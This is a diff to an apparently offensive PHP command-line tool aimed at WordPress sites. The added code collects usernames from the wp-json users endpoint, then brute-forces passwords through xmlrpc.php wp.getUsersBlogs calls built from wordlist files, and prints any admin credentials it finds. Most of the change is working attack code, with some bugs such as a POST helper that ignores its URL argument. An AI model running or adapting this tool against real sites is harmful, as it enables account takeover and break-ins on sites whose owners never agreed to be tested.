@@ -31,24 +31,24 @@ function checkURL($url){
 	return $httpCode;
 }
 
-function downloadString($url){
+function getString($url){
 	$curl = curl_init();
 	
 	curl_setopt_array($curl, array(
-	  CURLOPT_URL => $url,
-	  CURLOPT_RETURNTRANSFER => true,
-	  CURLOPT_ENCODING => '',
-	  CURLOPT_MAXREDIRS => 10,
-	  CURLOPT_TIMEOUT => 0,
-	  CURLOPT_FOLLOWLOCATION => true,
-	  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-	  CURLOPT_CUSTOMREQUEST => 'GET',
-	  CURLOPT_HTTPHEADER => array(
-		'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
-		'Accept: */*',
-		'Connection: keep-alive',
-		'Accept-Encoding: gzip, deflate, br'
-	  )
+		CURLOPT_URL 				=> $url,
+		CURLOPT_RETURNTRANSFER 		=> true,
+		CURLOPT_ENCODING 			=> '',
+		CURLOPT_MAXREDIRS 			=> 10,
+		CURLOPT_TIMEOUT 			=> 0,
+		CURLOPT_FOLLOWLOCATION 		=> true,
+		CURLOPT_HTTP_VERSION 		=> CURL_HTTP_VERSION_1_1,
+		CURLOPT_CUSTOMREQUEST 		=> 'GET',
+		CURLOPT_HTTPHEADER 			=> array(
+			'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
+			'Accept: */*',
+			'Connection: keep-alive',
+			'Accept-Encoding: gzip, deflate, br'
+		)
 	));
 
 	$response = curl_exec($curl);
@@ -56,6 +56,33 @@ function downloadString($url){
 	
 	curl_close($curl);
 	
+	return $response;
+}
+
+function postString($url, $payload){
+	$curl = curl_init();
+
+	curl_setopt_array($curl, array(
+		CURLOPT_URL 			=> 'http://localhost/wordpress/xmlrpc.php',
+		CURLOPT_RETURNTRANSFER 	=> true,
+		CURLOPT_ENCODING 		=> '',
+		CURLOPT_MAXREDIRS 		=> 10,
+		CURLOPT_TIMEOUT 		=> 0,
+		CURLOPT_FOLLOWLOCATION 	=> true,
+		CURLOPT_HTTP_VERSION 	=> CURL_HTTP_VERSION_1_1,
+		CURLOPT_CUSTOMREQUEST 	=> 'POST',
+		CURLOPT_POSTFIELDS 		=> $payload,
+		CURLOPT_HTTPHEADER 		=> array(
+			'Content-Type: application/xml',
+			'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
+			'Accept: */*',
+			'Connection: keep-alive'
+		),
+	));
+
+	$response = curl_exec($curl);
+
+	curl_close($curl);
 	return $response;
 }
 
@@ -108,16 +135,19 @@ function main(){
 		if(!$canEnum && !$canBruteforce){
 			echo "\n[BAD] Seems like nothing we can do here. Maybe the URL is not a WordPress Web Application.\n";
 		}else{
+			$foundUsers = [];
+			
 			if($canEnum){
 				echo "[PROGRESS] Enumerating Users:\n";
 				// echo $url . "wp-json/wp/v2/users";
-				$res = downloadString($url . "wp-json/wp/v2/users");
+				$res = getString($url . "wp-json/wp/v2/users");
 				
 				if(!is_null($res)){
 					$obj = json_decode($res);
 					
 					if(count($obj) > 0){
 						foreach($obj as $o){
+							$foundUsers[] = $o->name;
 							echo "[FOUND] Username: " . $o->name . "\n";
 						}
 					}else{
@@ -128,8 +158,90 @@ function main(){
 				}
 			}
 			
+			echo "\nThere are " . count($foundUsers) . " username were found.\n";
+			
 			if($canBruteforce){
+				$passPath = "";
+				$userPath = "";
 				
+				if(count($foundUsers) > 0){
+					$continueBrutforce = readline("\nContinue password bruteforce using found usernames? (y/n): ");
+					
+					echo "\n";
+					if($continueBrutforce == "y" || $continueBrutforce == "Y" || $continueBrutforce == "yes"){
+						$passPath = readline("Please insert password path file: ");
+						$userPath = null;
+					}
+				}
+				
+				if(!is_null($userPath)){
+					$userPath = readline("Please insert username path file: ");
+					$passPath = readline("Please insert password path file: ");
+				}
+				
+				$gotUserfile = true;
+				$gotPassfile = true;
+				if(!is_null($userPath) && !empty($userPath)){
+					if(!file_exists($userPath)){
+						$gotUserfile = false;
+						echo "\nUsername file not found at: " . $userPath;
+					}else{
+						if(!file_exists($passPath)){
+							$gotPassfile = false;
+							echo "\Password file not found at: " . $userPath;
+						}
+					}
+				}				
+				
+				if($gotUserfile && $gotPassfile){
+					echo "\n[PROGRESS] Bruteforcing in progress:\n";
+					
+					$users = [];
+					$passs = fopen($passPath, "rb");
+					
+					if(is_null($userPath)){
+						$users = $foundUsers;
+						
+						foreach($users as $u){
+							while(!feof($passs)){
+								$p = fgets($passs);
+								$payload = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" . $u . "</string></value></param><param><value><string>" . $p . "</string></value></param></params></methodCall>";
+								
+								$res = postString($xmlrpcURL . "xmlrpc.php", $payload);
+								
+								if(strpos($res, "isAdmin") > 0){
+									echo "[FOUND] Username: " . $u . ", Password: " . $p . "\n";
+								}
+							}
+						}
+						
+						fclose($passs);
+					}else{
+						$users = fopen($userPath, "rb");
+						
+						while(!feof($users)){
+							$u = trim(preg_replace('/\s\s+/', '', fgets($users)));
+							
+							echo "Testing on " . $u . ":\n";
+							
+							$passs = fopen($passPath, "rb");
+							while(!feof($passs)){
+								$p = trim(preg_replace('/\s\s+/', '', fgets($passs)));
+								$payload = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" . $u . "</string></value></param><param><value><string>" . $p . "</string></value></param></params></methodCall>";
+								
+								$res = postString($xmlrpcURL . "xmlrpc.php", $payload);
+								
+								if(strpos($res, "isAdmin") > 0){
+									echo "[FOUND] Username: " . $u . ", Password: " . $p . "\n";
+								}
+							}
+							
+							fclose($passs);
+						}
+						
+						fclose($users);
+					}					
+				}
 			}
 		}
 	}else{
@@ -137,7 +249,7 @@ function main(){
 		echo "Cannot access the URL. Make sure the URL is correct and accessible.\n";
 	}
 	
-	$exit = readline("\nDo you want to exit? (y/n)");
+	$exit = readline("\nDo you want to exit? (y/n): ");
 	
 	if($exit == "y" || $exit == "Y" || $exit == "yes"){
 		echo "\n\nThank you for using me! Bye!";
